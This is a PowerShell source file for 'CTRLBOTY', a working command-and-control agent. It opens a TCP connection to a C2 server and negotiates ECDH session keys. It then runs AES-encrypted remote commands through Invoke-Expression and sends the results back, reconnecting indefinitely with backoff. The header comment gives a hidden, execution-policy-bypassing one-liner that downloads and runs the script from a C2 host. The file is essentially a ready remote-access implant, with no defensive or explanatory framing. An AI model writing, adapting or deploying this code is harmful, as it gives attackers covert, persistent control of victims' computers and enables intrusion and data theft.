# CTRLBOTY - PowerShell Agent (Living-off-the-Land)
# Pure PowerShell, no disk writes, no external deps
#
# Usage: powershell -exec bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/ps.ps1')"
# Or:     powershell -c "& { .\agent.ps1 -Server 10.0.0.1 -Port 8443 }"

param(
    [string]$Server = "127.0.0.1",
    [int]$Port = 8443
)

$ErrorActionPreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# === Cryptography (AES-256-CBC via .NET) ===

function Get-RandomBytes([int]$count) {
    $bytes = New-Object byte[] $count
    (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
    return $bytes
}

function New-AesEncryptor([byte[]]$key, [byte[]]$iv) {
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    return $aes.CreateEncryptor()
}

function New-AesDecryptor([byte[]]$key, [byte[]]$iv) {
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    return $aes.CreateDecryptor()
}

function Protect-Bytes([byte[]]$key, [byte[]]$data) {
    $iv = Get-RandomBytes 16
    $enc = New-AesEncryptor $key $iv
    $ms = New-Object IO.MemoryStream
    $ms.Write($iv, 0, 16)
    $cs = New-Object Security.Cryptography.CryptoStream $ms, $enc, "Write"
    $cs.Write($data, 0, $data.Length)
    $cs.Close()
    return $ms.ToArray()
}

function Unprotect-Bytes([byte[]]$key, [byte[]]$encrypted) {
    $iv = $encrypted[0..15]
    $cipher = $encrypted[16..($encrypted.Length - 1)]
    $dec = New-AesDecryptor $key $iv
    $ms = New-Object IO.MemoryStream @(,$cipher)
    $cs = New-Object Security.Cryptography.CryptoStream $ms, $dec, "Read"
    $reader = New-Object IO.StreamReader $cs
    $result = $reader.ReadToEnd()
    $reader.Close()
    return [Text.Encoding]::UTF8.GetBytes($result)
}

# === Key Exchange (ECDH P-256 via .NET) ===

function New-SessionKeys($stream) {
    # Generate ECDH keypair
    $ecdh = [Security.Cryptography.ECDiffieHellmanCng]::new()
    $ecdh.KeyDerivationFunction = "Hash"
    $ecdh.HashAlgorithm = "SHA256"
    
    # Get our public key
    $ourPub = $ecdh.PublicKey.ToByteArray()
    
    # Send public key (length-prefixed)
    $len = [BitConverter]::GetBytes([uint32]$ourPub.Length)
    $stream.Write($len, 0, 4)
    $stream.Write($ourPub, 0, $ourPub.Length)
    
    # Receive server public key
    $lenBuf = New-Object byte[] 4
    $stream.Read($lenBuf, 0, 4) | Out-Null
    $peerLen = [BitConverter]::ToUInt32($lenBuf, 0)
    $peerPub = New-Object byte[] $peerLen
    $stream.Read($peerPub, 0, $peerLen) | Out-Null
    
    # Derive shared secret
    $peerKey = [Security.Cryptography.ECDiffieHellmanCngPublicKey]::FromByteArray($peerPub, "Key")
    $sharedSecret = $ecdh.DeriveKeyMaterial($peerKey)
    
    return $sharedSecret[0..31]  # First 32 bytes as AES-256 key
}

# === Network ===

function Connect-C2($server, $port) {
    $tcp = New-Object Net.Sockets.TcpClient
    $tcp.Connect($server, $port)
    $tcp.ReceiveTimeout = 30000
    $tcp.SendTimeout = 30000
    return $tcp
}

# === Core Agent ===

function Invoke-AgentLoop($stream, $key) {
    $writer = New-Object IO.BinaryWriter $stream
    $reader = New-Object IO.BinaryReader $stream
    
    # Send hostname
    $hostname = [Environment]::MachineName
    $hostBytes = [Text.Encoding]::UTF8.GetBytes($hostname)
    $writer.Write([uint32]$hostBytes.Length)
    $writer.Write($hostBytes)
    
    while ($true) {
        try {
            # Read message length
            $msglen = $reader.ReadUInt32()
            if ($msglen -eq 0 -or $msglen -gt 1048576) { break }
            
            # Read encrypted message
            $encMsg = $reader.ReadBytes($msglen)
            
            # Decrypt
            $plainBytes = Unprotect-Bytes $key $encMsg
            $command = [Text.Encoding]::UTF8.GetString($plainBytes).Trim()
            
            if ($command -eq "kill" -or $command -eq "exit") { break }
            
            # Execute via PowerShell
            $result = try {
                $output = Invoke-Expression $command 2>&1 | Out-String
                $output
            } catch {
                "Error: $_"
            }
            
            # Encrypt and send result
            $resultBytes = [Text.Encoding]::UTF8.GetBytes($result)
            $encResult = Protect-Bytes $key $resultBytes
            
            $writer.Write([uint32]$encResult.Length)
            $writer.Write($encResult)
            $writer.Flush()
            
        } catch {
            break
        }
    }
}

# === Main ===

function Main {
    Write-Host "[PS-AGENT] Connecting to $($Server):$($Port)..." -ForegroundColor Cyan
    
    $backoff = 5
    $maxBackoff = 300
    
    while ($true) {
        try {
            $tcp = Connect-C2 $Server $Port
            Write-Host "[PS-AGENT] Connected" -ForegroundColor Green
            
            # Key exchange
            $sessionKey = New-SessionKeys $tcp.GetStream()
            
            if (-not $sessionKey) {
                $tcp.Close()
                throw "Key exchange failed"
            }
            
            # Agent loop
            Invoke-AgentLoop $tcp.GetStream() $sessionKey
            
            $tcp.Close()
        } catch {
            Write-Host "[PS-AGENT] Disconnected, reconnecting in ${backoff}s..." -ForegroundColor Yellow
        }
        
        Start-Sleep -Seconds $backoff
        if ($backoff -lt $maxBackoff) { $backoff *= 2 }
    }
}

Main
